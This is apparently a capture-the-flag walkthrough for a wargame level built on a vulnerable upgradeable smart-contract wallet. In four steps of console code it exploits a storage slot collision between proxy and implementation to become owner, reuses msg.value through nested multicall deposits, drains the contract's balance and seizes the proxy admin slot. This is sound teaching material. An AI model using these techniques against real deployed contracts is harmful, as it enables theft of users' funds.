## Step 1
Become `owner` in implementation, in order to use `addToWhitelist`:
- `owner` is slot 0 in implementation, `pendingAdmin` is slot 0 in proxy; so set attacker(`player`) as `pendingAdmin`.
#### Step 1 console code
- `fnSig = {name: 'proposeNewAdmin', type: 'function', inputs: [{type: 'address', name: '_newAdmin'}]}`
- `data = web3.eth.abi.encodeFunctionCall(fnSig, [player])`
- `await web3.eth.sendTransaction({from: player, to: contract.address, data})`
- confirm with: `await contract.owner()`; should be address of attacker

## Step 2
Use `addToWhitelist` to add attacker to `whitelisted`, in order to access implementation functions; `multicall` `execute` `setMaxBalance`
#### Step 2 console code
- `await contract.addToWhitelist(player)`
- confirm with `await contract.whitelisted(player)`

## Step 3
Drain all funds from the implementation, in order to use `setMaxBalance`:
- use `deposit` via `multicall`, so that `msg.value` can be reused, in order to set `balances[attacker]` to maximum
- use `execute` to withdraw all funds to attacker
#### Step 3 console code
- `depositData = await contract.methods["deposit()"].request().then(value => value.data)`
- `multicallDepositData = await contract.methods["multicall(bytes[])"].request([depositData]).then(value => value.data)`
- `await contract.multicall([multicallDepositData, multicallDepositData], {value: 0.001 * 10**18})`
- `await contract.execute(player, await contract.balances(player).then(n=>n.toNumber()), 0)`
- confirm with `await getBalance(contract.address)`; should be 0 as all funds drained

## Step 4
Use `setMaxBalance` to set value of `admin` in proxy to attacker
#### Step 3 console code
- `await contract.setMaxBalance(player)`
